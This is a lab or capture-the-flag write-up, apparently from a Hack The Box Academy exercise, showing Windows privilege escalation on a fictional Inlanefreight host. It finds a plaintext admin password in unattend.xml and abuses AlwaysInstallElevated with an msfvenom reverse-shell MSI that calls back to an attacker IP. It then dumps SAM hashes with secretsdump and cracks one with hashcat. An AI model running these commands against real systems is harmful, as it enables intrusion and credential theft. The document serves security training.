## iamtheadministrator Password

Searching for file with iamtheadministrator string:
```powershell
PS C:\> findstr /SI /M "iamtheadministrator" *.xml *.ini *.txt

Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Windows\Panther\unattend.xml
```

Displaying the unattend file content:
```powershell
PS C:\> type Windows\Panther\unattend.xml

<!--*************************************************

Installation Notes

Location: HQ

Notes: OOB installer for Inlanefreight Windows 10 systems.

**************************************************-->



<?xml version="1.0" encoding="utf-8"?>

< SNIP >

<LocalAccounts>

<LocalAccount wcm:action="add">

<Password>

<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>

<PlainText>true</PlainText>

</Password>

<Description></Description>

<DisplayName>INLANEFREIGHT\iamtheadministrator</DisplayName>

<Group>Administrators</Group>

<Name>INLANEFREIGHT\iamtheadministrator</Name>

</LocalAccount>

</LocalAccounts>

< SNIP >
```

We can see here the password is `Inl@n3fr3ight_sup3rAdm1n!`.

## Privilege Escalation

Always installed elevated policy is enabled:
```powershell
PS C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer                                                                                                                                                                                       

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1



PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer                                                                                                                                                                                                    

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1


```

Generating `.msi` reverse shell:
```shell-session
# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.72 lport=9443 -f msi > aie.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

Starting Python server:
```shell-session
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Getting the shell to the target:
```powershell
Invoke-WebRequest http://10.10.16.72:8000/aie.msi -OutFile aie.msi
```

Starting a Listener:
![[Pasted image 20240622214305.png]]

Activating the shell from the target:
```cmd
C:\Users\htb-student\Desktop>msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart



C:\Users\htb-student\Desktop>
```

And we got a shell:
![[Pasted image 20240622214418.png]]

Getting the flag:
![[Pasted image 20240622214511.png]]

el3vatEd_1nstall$_v3ry_r1sky

## Getting the Password of the Local Admin

Copying the SAM and SYSTEM files:
```powershell
PS C:\Users\htb-student\desktop> reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.
PS C:\Users\htb-student\desktop> reg save HKLM\SAM SAM.SAV
reg save HKLM\SAM SAM.SAV
The operation completed successfully.
PS C:\Users\htb-student\desktop>
```

Now transferring the files to my machine with the shared folder through RDP.

Extracting the credentials with secretsdump.py:
```shell-session
# /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Cleaning up...
```

Cracking the hash for wksadmin:
```shell-session
# hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt           
```

Getting the password:
```shell-session
# hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt --show
5835048ce94ad0564e29a924a03510ef:password1
```
